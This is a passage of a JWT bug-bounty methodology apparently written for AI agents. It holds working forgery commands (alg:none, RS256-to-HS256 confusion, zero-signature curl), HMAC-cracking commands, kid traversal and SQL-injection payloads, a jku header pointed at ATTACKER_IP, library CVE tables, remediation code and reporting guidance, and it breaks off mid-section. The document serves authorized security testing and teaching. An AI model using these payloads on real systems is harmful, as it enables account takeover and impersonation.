---
technology: JWT (JSON Web Tokens)
kind: bug-bounty-methodology
audience: ai-agent
version: 0.3
last-refresh: "2026-11-19"
source: "rewritten from HackTricks (pentesting-web/hacking-jwt-json-web-tokens.md), CC BY-NC 4.0, accessed 2026-11-12; supplement: KathanP19/HowToHunt (JWT/), GPL-3.0, accessed 2026-11-13; token-forgery-craft supplement 2026-11-19 verified against primary advisories (NVD/GHSA)"
provenance: "hybrid: corpus-grounded (1 ledger rows, internal coverage ledger) + HackTricks enrichment 2026-11-13; library-CVE / allowlist-bypass / CTF supplement 2026-11-19 (research-grounded, advisories cited in References)"
---

Companion pages: [[jwt|JWT overview]] — the human introduction. Tool reference notes live in the separate tools vault (Vaults/tools); Appendix B maps each tool to the phase where it earns its keep.

---

# JWT Bug Bounty Methodology

**In scope:** JWTs (JWS compact serialization) wherever a target issues or verifies them — bearer headers, cookies, OAuth2/OIDC ID tokens, service-to-service tokens — and the verification code behind them. JWE (encrypted) tokens appear where noted.

**Out of scope:** the surrounding session/application logic (BOLA, mass assignment) — those follow the target framework's own methodology.

**Audience and rules:** an agent executing an authorized engagement. Every probe below is single-request and low-volume. Never brute-force a live endpoint; cracking happens offline. Forge claims for accounts you control until impact is proven; escalate a `sub` swap only as far as the program's rules allow.

**Goal invariant:** every attack in this file pursues one outcome — *the server accepts a payload you wrote*. You get there by breaking signature enforcement, guessing the signing secret, or steering key selection. Everything else is preparation.

### Where the money is (triage priority)

| Priority | Class | Typical shape | Typical severity |
|---|---|---|---|
| 1 | Signature not verified | Tampered payload + stale signature returns 200 | Critical |
| 2 | `alg` not pinned | `alg:none` accepted; RS256→HS256 confusion | Critical |
| 3 | Weak HMAC secret | HS256 secret from a wordlist, docs, or repo default | Critical |
| 4 | Registered claims unenforced | Expired/foreign-aud/foreign-iss token accepted | High |
| 5 | Key material from token headers | `jku`/`x5u`/`x5c`/embedded `jwk` trusted (CVE-2018-0114 class) | High–Critical |
| 6 | `kid` injection | Path traversal, SQLi, or command injection at key lookup | High–Critical |
| 7 | Cross-service relay | Token from client A of an IdP accepted by client B | High |

Phase 1 builds the token picture; Phase 2 is the payout matrix; Phase 3 tells you what secure code looks like (for report remediation); Phase 4 closes out.

---

## Phase 1 — Capture, scope, decode (always first)

Never attack a token you haven't read. Ten minutes of decoding picks which Phase 2 rows even apply.

### 1.1 Locate every token in traffic

JWTs hide in more places than the `Authorization` header. In the proxy, search all captured traffic (and JS bundles) with a regex for the base64url signature of a JWT header — `eyJ` starts the most common `{"alg":` encodings:

```
[= ]eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*
```

Check: `Authorization: Bearer` headers, session cookies, custom headers (`X-Access-Token`, `X-Auth-Token`), query strings, and browser storage behind the SPA (`localStorage`/`sessionStorage` keys via the JS console or an attached debugger).

### 1.2 Scope which token actually gates authorization

Applications often carry several tokens; only one may matter. Take a user-specific request (profile, billing, settings) and strip headers/cookies **one at a time**, replaying after each removal. The token whose removal flips 200 → 401/403 is the target of every later phase. Record the exact request it authorizes — that's your replay vehicle.

### 1.3 Decode and build the token card

```bash
python3 jwt_tool.py "$TOKEN"          # prints header, payload, claim values, validity notes
```

Fill in one card per token — this table decides the whole engagement:

| Field | Why it matters |
|---|---|
| `alg` | HS* → Phase 2.4 cracking applies; RS*/ES* → 2.3/2.8; missing/`none` → 2.2 immediately |
| `kid` | Present → Phase 2.7 (file probe, traversal, SQLi, command injection) |
| `jku` / `x5u` / `x5c` / embedded `jwk` | Present → Phase 2.6 (verifier may fetch/adopt your key) |
| `iss` / `aud` | Identifies the issuing IdP; foreign-client signup → Phase 2.9 relay |
| `exp` − `iat` | Lifetime. >24h or absent → note it; enforcement tested in 2.5 |
| `sub`, `role`, `scope`, `tenant_id`, `groups` | The claims an authz decision reads — your forgery targets |

The payload is plaintext: treat every claim as recon (emails, internal IDs, tenant names, the IdP's hostname) before touching the signature.

### 1.4 Establish provenance and baseline

- **Provenance.** Find the first occurrence of the token in proxy history. First seen *from the client* suggests client-side minting — hunt the signing material in the JS bundle. First seen *from the server* is the normal case.
- **Baseline responses.** Replay the token intact, then with one flipped signature character. An error body (`Signature verification failed`, library-flavored 500) both proves verification happens and fingerprints the library; identical 200s mean no verification (go directly to Phase 2.1's tamper). A tool-driven alternative: `jwt_tool.py -M at -t <url> -rh "Authorization: Bearer $TOKEN"` runs the full playbook against the live endpoint and highlights anomalous responses.

**Deliverable:** the token card, the gating request, and the baseline error shape.

---

## Phase 2 — The token attack matrix

Run every captured token through every row that its card admits. The same matrix, aimed at a FastAPI verifier specifically (python-jose/PyJWT pitfalls, CVE history), is Phase 2 of [[fastapi-bug-bounty]] — worth a look when the stack is Python.

| # | Test | Action | Secure response | Finding if it fails |
|---|---|---|---|---|
| 1 | Signature enforcement | Flip 1–2 bytes of the signature segment, replay | 401 | 200 = payload is editable, stop here, escalate claims |
| 2 | Payload tamper, stale sig | Change `sub`/`role`, keep original signature | 401 | 200 = same as #1 |
| 3 | `alg:none` | `alg:none` + empty signature | 401 | 200 = unsigned tokens accepted |
| 4 | RS→HS confusion | Re-sign as HS256 with the public key as HMAC secret | 401 | 200 = verifier HMACs with public material |
| 5 | Weak HMAC secret | Offline crack (2.4) | — | Any hit = forge anything |
| 6 | Expired token | Valid-signature token past `exp`, replay | 401 | 200 = `exp` not enforced |
| 7 | Foreign `aud`/`iss` | Valid-signature token from another audience of the same IdP | 401 | 200 = claims not checked |
| 8 | Zero ECDSA signature | `r=s=0` raw signature (2.8) | 401 | 200 = no range check, forgery without any key |
| 9 | Header-supplied key | `jku`/`x5u` → your JWKS; embedded `jwk`/`x5c` (2.6) | fetch refused / 401 | Callback or 200 = verifier adopts attacker keys |
| 10 | `kid` abuse | Traversal / SQLi / command injection (2.7) | rejected | Known-content file, SQL error, or RCE |
| 11 | Cross-service relay | Token minted for client B of the IdP, replayed here | 401 | 200 = audience isolation broken |

Details and mechanics for the non-trivial rows:

### 2.1 Signature enforcement — the one-minute check

Tamper a claim you can observe (`sub` → your second account, or a display name), leave the signature untouched, and replay. Any difference from baseline (error body, changed response) means verification runs. Identical success means it doesn't — pick privileged-looking claims and proceed straight to reporting. Even when verification runs, read verbose error bodies: they often name the library and version (free fingerprint for Phase 3-style remediation wording).

### 2.2 `alg:none` and friends

Build the token with the third segment empty and `alg` set to `none` — and try case variants (`None`, `NONE`, `nOnE`) because some verifiers compare case-insensitively:

```bash
python3 jwt_tool.py "$TOKEN" -X a     # emits the alg:none variant for replay
```

If a library refuses to emit it, assemble by hand: `base64url(header).base64url(payload).` — trailing dot, nothing after.

### 2.3 RS256→HS256 confusion (CVE-2016-10555 family)

If the card says RS256 and the verifier doesn't pin algorithms, sign an HS256 token whose HMAC secret is the *public* key bytes — material you already have. Fetch it from the JWKS endpoint or peel it off the TLS certificate:

```bash
openssl s_client -connect api.example.com:443 </dev/null 2>/dev/null \
  | sed -n '/-----BEGIN/,/-----END/p' > chain.pem
openssl x509 -pubkey -in chain.pem -noout > pubkey.pem

python3 jwt_tool.py "$TOKEN" -X k -pk pubkey.pem -I -pc sub -pv admin
```

Replay. A 200 means the verifier accepted an HMAC keyed on public material — full forgery. The exact PEM representation matters (raw DER vs PEM text produce different HMAC keys); if one form fails, try the other before concluding the verifier is safe.

### 2.4 Crack the HMAC secret (offline only)

Any HS* token is a crackable hash. Dump it to a file and attack locally — never against the live endpoint:

```bash
echo "$TOKEN" > jwt.txt
python3 jwt_tool.py "$TOKEN" -C -d jwt.secrets.list      # CPU dictionary attack
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt \
        -r /usr/share/hashcat/rules/best64.rule          # GPU (newer hashcat ships the ruleset as best66.rule)
```

Before burning GPU time, collect free candidates: example/default secrets shipped in the project's docs, README, or `appsettings.json`-style config in the public repo are the first thing to try — a target still running on the published default is an instant Critical. A recovered secret also explains *future* tokens: re-sign anything with `-T`.

Corollary when you hold a file-read primitive: config + database leaks have been combined to *derive* a signing secret offline (key material from a config file, per-user values from the DB), then forge session tokens without ever knowing a password. If a leak exposes both, look for the derivation before declaring the signing key safe.

### 2.5 Registered-claim enforcement

- **`exp`** — if the token carries one, wait it out (or set your clock-forward check via a stored replay) and replay after expiry. Still-valid = never-expiring credential. `python3 jwt_tool.py "$TOKEN" -R` reads the timestamps and computes remaining lifetime.
- **`aud` / `iss`** — obtain a correctly-signed token from a *different* audience of the same issuer: register on another app served by the target's IdP, or use the IdP's own first-party token. Replay it at the target. A 200 means the verifier checks signatures but not who the token was for — on OIDC-consuming apps this is the whole tenant boundary.
- **`nbf`** — same shape with a future `nbf` if you can mint one.

### 2.6 Key material supplied by the token

The header can tell the verifier where to get a key — and some verifiers obey.

**`jku` (JWK Set URL) / `x5u` (X.509 URL):** generate your own keypair, host a JWKS/PEM containing your public key, and point the header at it:

```bash
openssl genrsa -out keypair.pem 2048
openssl rsa  -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -nocrypt -in keypair.pem -out pkcs8.key
# serve a JWKS built from your public key at  http://ATTACKER_IP/jwks.json
python3 jwt_tool.py "$TOKEN" -X s        # spoofs jku to your hosted key set (set its location in jwtconf.ini)
```

Any HTTP hit on ATTACKER_IP proves the server fetches key material from token input (SSRF primitive on its own); a 200 on the re-signed token is full forgery. For a blind yes/no on fetch behavior, embed an out-of-band callback URL in `jku`/`x5u` before investing in the full setup.

**Embedded `jwk` header / `x5c` chain (CVE-2018-0114 class):** the key rides inside the token itself. Mint a fresh keypair, embed its public half in the header (`jwk` or `x5c`), sign with the private half — verifiers that adopt the embedded key accept the token.

### 2.7 `kid` — from key lookup to injection sink

`kid` selects the verification key, and it flows into file paths, SQL, and sometimes shells. Escalate in order:

1. **File probe.** `kid` of `key/12345` → request `/key/12345` and `/key/12345.pem` on the web root; the key may just be lying there.
2. **Traversal to known content.** Point `kid` at a file whose contents you know, then HMAC-sign with those contents as the secret — a Linux box's `/proc/sys/kernel/randomize_va_space` contains the single line `2`; an empty file (`/dev/null`) means signing with an empty secret:

```bash
python3 jwt_tool.py "$TOKEN" -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```

3. **SQL injection** when `kid` indexes a key table — force a known secret into the lookup and sign with it:

```
kid: x' UNION SELECT 'attacker-chosen-secret';-- -
```

4. **Command injection** when `kid` reaches a shell (key conversion scripts, `openssl ...` one-liners) — a `;`-chained command can exfiltrate the real private key outright. This row is RCE; report immediately.

### 2.8 ES256/ES384/ES512 — the all-zero signature

ECDSA verification math accepts `r = s = 0` for *any* message unless the verifier range-checks both integers first (the CVE-2022-21449 "psychic signature" class). JWS uses the raw `r||s` encoding, so the forgery is just zero bytes: 64 for ES256 (86 `A` characters in base64url), 96/128 for ES384, 132/176 for ES512.

```bash
b64() { printf '%s' "$1" | base64 | tr '+/' '-_' | tr -d '='; }
H=$(b64 '{"alg":"ES256","typ":"JWT"}')
P=$(b64 '{"sub":"attacker@example.com","role":"admin","exp":9999999999}')
S=$(printf 'A%.0s' $(seq 1 86))
curl -s https://api.example.com/api/me -H "Authorization: Bearer $H.$P.$S"
```

No key needed at all — if accepted, every claim in `P` is yours. A correct verifier rejects it exactly like any bad signature.

### 2.9 Cross-service relay

If the target outsources token issuance (shared JWT service, IdP), register on *another client* of the same issuer using the same username/email, take the token it hands you, and replay it at the target. Acceptance means one issuer's tokens are good across all its clients — account spoofing at scale. (Check program scope before signing up anywhere third-party.) While there, probe replay protection: a `jti` claim drawn from a tiny ID space (four digits) wraps around — request 10,000 tokens and the first IDs recycle.

---

## Phase 3 — What secure verification looks like (code pairs)

For report remediation sections, and to sharpen your judgment of what a diff should say.

```python
# VULNERABLE (PyJWT-style) — algorithm taken from the token, claims unchecked
payload = jwt.decode(token, KEY)                    # alg from header; exp/aud/iss ignored

# SECURE — algorithm pinned, key typed correctly, claims required and verified
payload = jwt.decode(
    token,
    PUBLIC_KEY,                                     # asymmetric: public key, never a shared secret
    algorithms=["RS256"],                           # constant list — never the token's alg
    audience="api.example.com",
    issuer="https://auth.example.com",
    options={"require": ["exp", "iat", "sub"]},     # absent claims are a hard failure
)
```

```javascript
// VULNERABLE (Node jsonwebtoken-style)
const payload = jwt.verify(token, SECRET);          // HS256 default; nothing else enforced

// SECURE — pinned algorithm + explicit claim checks
const payload = jwt.verify(token, PUBLIC_KEY, {
  algorithms: ["RS256"],
  audience: "api.example.com",
  issuer: "https://auth.example.com",
});
```

The secure shape, regardless of language: (1) a hard-coded allowlist of algorithms, so header bytes cannot steer dispatch; (2) key material resolved from server configuration only — `jku`/`x5u`/`x5c`/embedded `jwk` never consulted, `kid` at most an index into a server-side keyring; (3) `exp` required and enforced, `aud`/`iss` matched against expected constants; (4) a rejected token fails closed with one generic error (no library fingerprints).

---

## Phase 4 — Reporting and closeout

- **Title the impact, not the technique.** "Forged admin token accepted by `GET /api/users` (unpinned algorithm + RS256→HS256 confusion)" — not "JWT vulnerability".
- **Evidence ladder:** unsigned/confused token for *your own* account first (proves acceptance); a `sub` swap to a second account you control (proves impersonation); stop there unless the program explicitly authorizes more. Include the exact forged token, the request, and both responses.
- **Severity anchors:** any signature/trust bypass that yields another identity — Critical. `exp` ignored on long-lived tokens — High. `aud`/`iss` unchecked on a single-tenant app — Medium/High depending on issuer reach. `jku` SSRF callback alone — Medium, but usually the preamble to a Critical.
- **Remediation:** point at the Phase 3 code pair and name the root cause class (unpinned algorithm, unenforced claim, header-supplied key, weak symmetric secret).

**Falsifiable closeout claims** — for each, record what you tried and where you stopped:

| Claim you tried to prove | Rejected (secure) if |
|---|---|
| The payload can be altered with acceptance | every tampered variant 401s (2.1–2.2) |
| Tokens can be minted without the private key | confusion, none, zero-sig, and header-key rows all fail (2.2–2.3, 2.6, 2.8) |
| The HMAC secret is recoverable | dictionary + default-secret passes come up empty (2.4) |
| Stale/foreign tokens are honored | expired and foreign-aud replays 401 (2.5, 2.9) |
| The verifier fetches keys from token input | no callback to ATTACKER_IP, embedded keys rejected (2.6) |

---

## Appendix A — Command quick reference

```bash
python3 jwt_tool.py "$TOKEN"                                   # decode + token card
python3 jwt_tool.py "$TOKEN" -T                                 # interactive tamper + re-sign
python3 jwt_tool.py "$TOKEN" -X a                               # alg:none variant
python3 jwt_tool.py "$TOKEN" -X k -pk public.pem -I -pc sub -pv admin   # RS->HS confusion
python3 jwt_tool.py "$TOKEN" -X s                               # jku -> your JWKS
python3 jwt_tool.py "$TOKEN" -I -hc kid -hv "../../dev/null" -S hs256 -p ""   # kid traversal
python3 jwt_tool.py "$TOKEN" -C -d jwt.secrets.list             # crack HMAC secret
python3 jwt_tool.py "$TOKEN" -R                                 # timestamps / remaining lifetime
python3 jwt_tool.py "$TOKEN" -V -pk public.pem                  # verify against a known key
python3 jwt_tool.py -M at -t https://api.example.com/api/me \
    -rh "Authorization: Bearer $TOKEN"                          # live playbook scan
hashcat -a 0 -m 16500 jwt.txt rockyou.txt -r rules/best64.rule  # GPU secret crack (offline)
myjwt "$TOKEN" --none-vulnerability                             # alg:none variant
```

## Appendix B — Tooling mapped to phases

- **jwt_tool** (tools vault: `cracker/jwt-tool`) — the workhorse. Phase 1 decode/token card (`-R` for timestamps), Phase 2 forgery (`-X a`/`-X k`/`-X s`, `-I -hc/-pc` claim rewrites, `-T` interactive), offline cracking (`-C -d`), and the live `-M at`/`-M pb` scans that replay the playbook through the real request pipeline with a response canary.
- **hashcat** (tools vault: `wireless/hashcat`) — Phase 2.4 only. `-m 16500` is the JWT-HS* mode; straight dictionary with a rules file is the standard first pass. Offline by definition.
- **myjwt** (tools vault: `exploitation/myjwt`) — a lighter CLI covering the same classics: decode (`--print`), `--none-vulnerability`, claim/header injection (`--add-payload`/`--add-header` + `--sign`), brute force, and kid/jku/x5u attack modes.
- **Burp Suite JWT Editor** (PortSwigger extension) — Phase 1 decode inside Repeater, key management (load the target's public key, register your own), and one-click versions of Phase 2: none-alg, HMAC key confusion, embedded JWK, and `jku`/`x5u` with an embedded out-of-band collaborator payload (the cleanest blind fetch probe).
- **SignSaboteur** (Burp extension) — launches the standard JWT attacks from Repeater; a good alternative when JWT Editor's key handling fights the target's format.
- **jwtlint** — offline static triage of a captured token: flags `alg:none`, confusion candidates, risky header parameters (`jku`/`x5u`/`jwk`/`x5c`), missing `exp`, and kid-injection patterns before you've sent anything.
- **jwt.io — caution.** The hosted debugger at jwt.io is a third-party website: every pasted token and its claims transit and rest on infrastructure you don't control, and tokens are bearer credentials — a pasted live token is a leaked session. Use it only for tokens you minted yourself; for target-issued tokens, decode locally (jwt_tool/myjwt/JWT Editor — all do the same base64url split) and keep production material out of browsers entirely.

## Supplement (2026-11-13) — rewritten from KathanP19/HowToHunt (JWT/), GPL-3.0, accessed 2026-11-13

Diff-first: the source's core playbook — token anatomy and registered claims, `alg:none` with case variants, RS→HS confusion, unchecked signatures, offline cracking (`hashcat -m 16500`, `jwt_tool -C`), kid traversal-to-`/dev/null`/SQLi/command-injection, `jku`/`jwk`/`x5u`/`x5c` key-steering, the `eyJ` proxy-history regex, `jwt_tool -M at` live scans — is all covered above. One operator delta survives.

**Empty payload when claims resist forgery.** With the HMAC secret cracked but the payload carrying values you cannot guess (a per-user UUID, a session-bound identifier), re-sign a token with an EMPTY payload object `{}` and replay it: verifiers that read claims defensively can fail open on missing values — identity falling back to a default or first-class account — and have accepted the empty token where no honestly forged claim would validate. Field-reported to yield privileged access more than once; it costs one request, so it belongs in the standard post-crack loop next to `-T` tampering.

## References

- RFC 7519 (JWT), RFC 7515 (JWS), RFC 7517 (JWK), RFC 7518 (JWA) — https://www.rfc-editor.org/rfc/rfc7519
- IANA registered-claim registry — https://www.iana.org/assignments/jwt/jwt.xhtml
- ticarpi jwt_tool attack methodology — https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology
- Neil Madden, "Psychic Signatures in Java" (CVE-2022-21449) — https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/
- CVE-2016-10555 (node-jsonwebtoken algorithm confusion) — https://nvd.nist.gov/vuln/detail/CVE-2016-10555
- CVE-2018-0114 (embedded-key forgery, node-jose) — https://nvd.nist.gov/vuln/detail/CVE-2018-0114

## Supplement 2 (2026-11-19) — library-specific verification footguns and the CVE map

*Source: research pass 2026-11-19, every CVE re-verified against its NVD record or GitHub Security Advisory (links in the extended References below). Extends the Phase 2 matrix and Phase 3 remediation. Nothing above was rewritten — this maps the library-agnostic matrix onto the concrete library bugs that make each row actually land.*

The Phase 2 matrix is deliberately library-agnostic: it describes *what* to send. This supplement answers *which verifier will accept it, and why* — because the same `alg:none` or RS→HS token lands against one library's default and bounces off another's. Fingerprint the verifier first (Phase 1.4 baseline), then jump to its subsection. Every row here is a published CVE, not a theoretical shape — a version-matched target *is* the finding.

### 2.10 Fingerprint the verifier from its error strings

Before picking a library-specific bug, confirm which library is behind the 401/500. Send a token with a flipped signature byte and read the raw error (or the wrapped `detail`); the wording is a near-unique tell. Corroborate two or three before asserting — custom handlers rewrite messages.

| Library | Signature-fail wording | Expired wording | Structural-fail wording |
|---|---|---|---|
| PyJWT (Python) | `Signature verification failed` | `Signature has expired` (`ExpiredSignatureError`) | `Not enough segments`, `Invalid crypto padding` |
| python-jose (Python) | `Signature verification failed.` (trailing period), `JWTError` | `Signature has expired.` | `Not enough segments`, `jose.exceptions.JWSError` |
| jsonwebtoken (Node) | `invalid signature` | `jwt expired` | `jwt malformed`, `invalid algorithm`, `jwt audience invalid` |
| golang-jwt (Go) | `token signature is invalid` | `token is expired` / `token has invalid claims` | `token contains an invalid number of segments` |
| firebase/php-jwt (PHP) | `Signature verification failed` | `Expired token` | `Wrong number of segments`, `UnexpectedValueException` |
| ruby-jwt (Ruby) | `Signature verification failed` (`JWT::VerificationError`) | `Signature has expired` (`JWT::ExpiredSignature`) | `Not enough or too many segments` |

A leaked raw exception or stack fragment is a separate information-disclosure finding — capture it verbatim before it is patched.

### 2.11 python-jose — the most dangerous default in the ecosystem

`jose.jwt.decode(token, key)` defaults to **`algorithms=None`, which performs no allowlist check at all** — the verifier dispatches on the token's own `alg` header. That single default re-enables the entire confusion family (rows 3–4) unless the app passes an explicit list. The project has been dormant since May 2025; the critical confusion bug below has **no fixed release**.

| CVE | Affected | Bug (attacker view) | Fix |
|---|---|---|---|
| CVE-2024-33663 (CVSS 6.4–8.1) | ≤ 3.3.0 | Algorithm confusion via ECDSA/DER key formats; the HMAC-secret guard misses DER-encoded public keys | 3.4.0 (**incomplete**) |
| CVE-2024-33664 (CVSS 5.3) | ≤ 3.3.0 | "JWT bomb": a crafted JWE with a high compression ratio exhausts memory/CPU during `decode()` — single token, no auth | 3.4.0 |
| CVE-2026-85394 (CVSS 9.1 / 9.3 v4) | ≤ 3.5.0 (**no fix exists**) | Named follow-up to 2024-33663: the guard `is_pem_format(key) or is_ssh_key(key)` rejects PEM/SSH armor but **not raw DER** public-key bytes. If the server feeds its public key to `decode()` as raw DER and `algorithms` is unrestricted or mixes RS+HS, forge HS256 tokens signed with the public key | none — migrate off |

Concretely, when the card says python-jose and RS256: get the public key (Phase 2.6 acquisition order), then try the confusion both ways — PEM-text secret *and* raw-DER secret — because 2026-85394 specifically lives on the DER path the 2024 fix left open. The remediation to cite is Red Hat's: pass an explicit **asymmetric-only** allowlist (`algorithms=["RS256"]`, HMAC excluded); never rely on `algorithms=None`. Any python-jose deployment that mixes HS+RS in its allowlist, or omits it, is a finding regardless of version — there is nothing to patch to.

### 2.12 PyJWT — the guard everyone trusts, and its 2026 cluster

PyJWT is the library the FastAPI docs (and this guide's Phase 3) recommend over python-jose — but its confusion guard is `is_pem_format()`, and that guard has been bypassed repeatedly. PyJWT *does* require an explicit `algorithms=[...]` (it raises if omitted), so the pure misconfigured-allowlist path (HS+RS both listed) is the first thing to check; the CVEs below defeat the guard even when the allowlist looks careful.

| CVE | Affected | Bug (attacker view) | Fix |
|---|---|---|---|
| CVE-2022-29217 (CVSS 7.5) | ≥ 1.5.0, < 2.4.0 | "Key confusion through non-blocklisted public key formats" — the original guard missed formats, letting a public key ride in as the HMAC secret | 2.4.0 |
| CVE-2024-53861 (CVSS 2.2–7.5, disputed) | 2.10.0 | `iss` compared with a **substring** test — `iss:"abc"` passes a check against `"_abc_"`. Signature still must validate, so it is an issuer-scoping weakness, not a standalone bypass | 2.10.1 |
| CVE-2026-32597 | < 2.12.0 | Unknown `crit` header extensions accepted (RFC 7515 violation) — a `crit` the verifier should reject is ignored | 2.12.0 |
| CVE-2026-101918 | < 2.15.0 | Deeply nested-JSON token payload → `RecursionError` → HTTP 500; one request is a request-level DoS | 2.15.0 |
| CVE-2026-102268 (CVSS 9.1) | < 2.14.0 | `is_pem_format()` misses PEM variants the `cryptography` loader still accepts — a **mutated** public-key PEM passed as raw bytes bypasses the 2022-29217 guard and becomes the HMAC secret | 2.14.0 |
| CVE-2026-102271 | < 2.15.0 | DER-key variant of the same guard bypass | 2.15.0 |

The mutated-PEM forms that defeat `is_pem_format()` (GHSA-ffc3-869f-jxw9): marker-adjacent whitespace/indentation, bare-CR (`\r`) line terminators, or every line folded onto one. `cryptography.load_pem_public_key()` accepts the identical bytes the guard rejected. Preconditions: the verification key is passed as raw bytes on the non-`PyJWK` path, `cryptography` is installed, and the allowlist mixes HS + an asymmetric alg. These forms **arise naturally** from an indented YAML/JSON config block, a single-line env var, or CR/LF round-trips through config tooling — so a target that loads its public key from config is a realistic candidate, not a lab-only one. Safe remediation floor: **PyJWT ≥ 2.15.0**, asymmetric-only allowlist.

### 2.13 Node `jsonwebtoken` (Auth0) — defaults that fall open

The classic Node verifier. Three CVEs cluster at **≤ 8.5.1, all fixed in 9.0.0**, which is also the release that started requiring `KeyObject`/PEM typing and rejecting ambiguous key material:

| CVE | Bug (attacker view) | Notes |
|---|---|---|
| CVE-2015-9235 / CVE-2016-10555 | Original RS256→HS256 confusion: `verify()` with a public key as `secretOrPublicKey` and no `algorithms` option HMACs with the public key | the canonical alg-confusion bug; row 4 of the matrix |
| CVE-2022-23540 (CVSS 6.4–7.6) | `verify()` with no `algorithms` option **falls back to accepting `none`** / unrestricted algs — signature validation bypass | row 3; check whether the app passes `algorithms` |
| CVE-2022-23541 (CVSS 5.0–6.3) | Insecure `secretOrPublicKey` / key-retrieval type handling → RSA↔HMAC forgeable tokens | row 4, triggered through a `KeyObject` type confusion |
| CVE-2022-23529 | Improper input validation of `secretOrPublicKey`: a crafted/forced value can crash the verify path (DoS) | needs attacker influence over the key argument |

Test posture: if fingerprinting says `jsonwebtoken` and the version predates 9.0.0 (leaked in a source map, `package-lock.json`, or an error stack), the `none`-fallback and confusion rows are both live. On ≥ 9.0.0 the library enforces typed keys and an explicit `algorithms` list, so pivot to misconfiguration (does the app itself pass `algorithms: ["none"]` or both HS+RS?).

### 2.14 golang-jwt / jwt-go — the audience array and the dot bomb

The original `dgrijalva/jwt-go` is abandoned; the maintained fork is `golang-jwt/jwt`. Two distinct finds:

| CVE | Affected | Bug (attacker view) | Fix |
|---|---|---|---|
| CVE-2020-26160 (CVSS 5.0–7.5) | `dgrijalva/jwt-go` < 4.0.0-preview1 | `aud` **array** type confusion: when `aud` is a `[]string` (not a scalar) and `MapClaims.VerifyAudience` runs with `req=false`, audience verification is **skipped entirely** — a token for any audience passes | migrate to `golang-jwt` 3.2.1+ |
| CVE-2025-30204 (CVSS medium–high) | golang-jwt < 4.5.2 and < 5.2.2 | Excessive memory allocation while splitting a token header: an `Authorization` header stuffed with period (`.`) characters allocates proportional to its length — unauthenticated memory DoS | 4.5.2 / 5.2.2 |

The `aud`-array bug is the Go-specific flavor of matrix row 7 (foreign `aud`): if the target is a Go service that lacks its own audience check and relies on the library default, a token minted with `aud` as a one-element array can slip the check. The dot-bomb (2025-30204) is a single-request probe — send a long run of dots in the token position and watch latency/memory, then stop.

### 2.15 firebase/php-jwt and ruby-jwt — kid confusion and the empty key

| Library | CVE | Bug (attacker view) | Fix |
|---|---|---|---|
| firebase/php-jwt | CVE-2021-46743 (CVSS 9.1) | `kid` key/algorithm **type confusion**: when a `$keys` key-ring holds mixed key types (an RS public key and an HS secret), a `kid` selecting the HMAC entry lets an RS→HS confusion token validate — the library picked the key but not the matching algorithm | 6.0.0 |
| firebase/php-jwt | GHSA-h533-5v22-8vcp (2024) | `"none"` algorithm treated as valid on tokens in older releases — matrix row 3 straight through | upgrade |
| ruby-jwt | CVE-2026-45363 (CVSS 7.4–9.1, disputed) | HS256 verification **accepts a token signed with an empty key** — the library's own `/dev/null`-equivalent, no file-read primitive needed | 2.10.3 / 3.2.0 |

The ruby-jwt empty-key bug is the library-level twin of the Phase 2.7 traversal-to-`/dev/null` trick: where 2.7 *forces* an empty secret via a path, CVE-2026-45363 means an empty-key HMAC is accepted outright on vulnerable versions. Sign with `""` as the HS256 secret and replay. The php-jwt `kid` row is why Phase 2.7's `kid` escalation pays off even without traversal — a mixed key-ring plus an attacker-chosen `kid` is confusion by key *selection*.

### 2.16 Algorithm-allowlist bypass craft (when a list exists but still loses)

An `algorithms=[...]` list is necessary but not sufficient. The ways a present allowlist still falls:

- **Case and whitespace on `none`.** Even a `none`-blocking check can miss `None`/`NONE`/`nOnE` (Phase 2.2) or ` none` with leading space if the comparison is naïve. RFC alg names are case-sensitive; a case-insensitive *reject* list that normalizes wrong, or a case-sensitive *accept* list the library then lowercases, both leak.
- **HS and RS in the same list.** The most common real bug: `algorithms=["RS256","HS256"]` (copy-pasted "support everything"). The RS→HS confusion of rows 4 / 2.3 works *because* HS256 is allowed — the list is honored and the token still forges. Any allowlist mixing symmetric and asymmetric families is a finding on its own; report it even before you land the forged token.
- **Substring / type-confused matching.** If the "allowlist" is a string, not a list (`if alg in "RS256"`), substrings (`"RS2"`, `"S2"`) match — the issuer-substring class (CVE-2024-53861) applied to `alg`.
- **`crit` header smuggling.** A verifier that ignores unknown `crit` extensions (CVE-2026-32597) can be steered by extensions it was required to reject — probe any header param the token carries that you do not recognize.
- **Empty allowlist / dispatch-after-check.** Some wrappers validate `alg` against a list, then *separately* call a decode that re-reads the header `alg` — the check and the dispatch disagree. The tell: a 200 on a token whose header `alg` the app "rejected." Verify the check actually gates the decode, not just a log line.

---

## Supplement 3 (2026-11-19) — CTF notes: box-staple patterns vs. a live bounty

JWT is a web-CTF staple, and the techniques above are the exact ones challenge authors plant. The mechanics are identical; the *environment* and *goal* differ, and confusing the two wastes time (or burns a program's rules). Where a technique below is a CTF classic, the contrast column says what changes on a real engagement.

| Technique | In a CTF (box staple) | In an authorized bounty |
|---|---|---|
| `alg:none` (2.2) | First thing to try; frequently the intended solve. Author leaves the verifier accepting `none` outright | Rare on maintained stacks but *always* worth one probe — it is free and occasionally present behind a custom wrapper |
| RS→HS confusion (2.3) | Public key is handed to you — served at `/`, `/jwks.json`, `/public.pem`, or printed in a hint | You must *acquire* the key (JWKS, `x5c` in a real token, TLS cert, repo). No key → the test is not demonstrable; say so (2.6) |
| Weak HMAC secret (2.4) | Secret is a rockyou word — `secret`, `password`, `jwt`, `key`, the challenge name | Published framework defaults and leaked repo secrets are the realistic hits; a generic wordlist rarely cracks a production secret. Offline only, always |
| `kid` traversal to `/dev/null` (2.7) | Intended path; sign with empty secret and read the flag as admin | Needs a known-content file and a real `kid`→filesystem flow; blind, higher bar |
| `kid` SQLi (2.7) | Author wires `kid` into a sqlite lookup; `UNION SELECT 'key'` is the solve | Genuine but uncommon; chain carefully and prove with your own account first |
| Embedded `jwk`/`jku` (2.6) | Server fetches your JWKS from a challenge-provided URL, or adopts an embedded key | `jku`/`x5u` fetch is also an SSRF primitive — report the callback even if forgery fails |
| Empty payload `{}` / empty key | Classic "fail-open" solve (see the KathanP19 supplement, and ruby-jwt CVE-2026-45363) | Field-reported but situational; one request, belongs in the post-crack loop |

**What is genuinely different, not just harder:**

